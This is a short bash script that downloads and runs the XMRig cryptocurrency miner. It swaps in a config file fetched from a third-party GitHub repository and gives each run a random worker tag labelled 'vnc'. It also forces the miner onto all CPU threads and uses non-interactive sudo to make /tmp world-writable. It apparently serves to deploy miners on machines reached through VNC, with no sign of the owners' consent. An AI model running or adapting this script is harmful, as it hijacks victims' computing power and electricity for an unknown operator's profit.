#!/bin/bash

if [ -d /tmp ]; then
    echo "/tmp exists"
else
    # create tmp if it doesn't exist (yes that happened...)
    sudo -n mkdir /tmp
    sudo -n chmod 777 /tmp
fi

if command -v wget >/dev/null 2>&1; then
    DOWNLOAD_CMD="wget"
else
    DOWNLOAD_CMD="curl -O"
fi

# use curl because it's present on more distributions
$DOWNLOAD_CMD https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz
tar -xf xmrig-6.21.3-linux-static-x64.tar.gz
cd xmrig-6.21.3

rm -rf config.json
$DOWNLOAD_CMD https://raw.githubusercontent.com/spetterman66/verynicerepo/main/config.json
randnum=$(( RANDOM % 1000 + 1 ))
sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json

num_threads=$(lscpu | grep "^CPU(s):" | awk '{print $2}')

# generate the replacement string with -1 repeated num_threads times, separated by commas
replacement_string=$(printf '-1%.0s, ' $(seq 1 $num_threads))
replacement_string=${replacement_string%, }  # remove the trailing comma and space

sed -i "s/THREADSTRINGTOREPLACE/$replacement_string/g" config.json

./xmrig
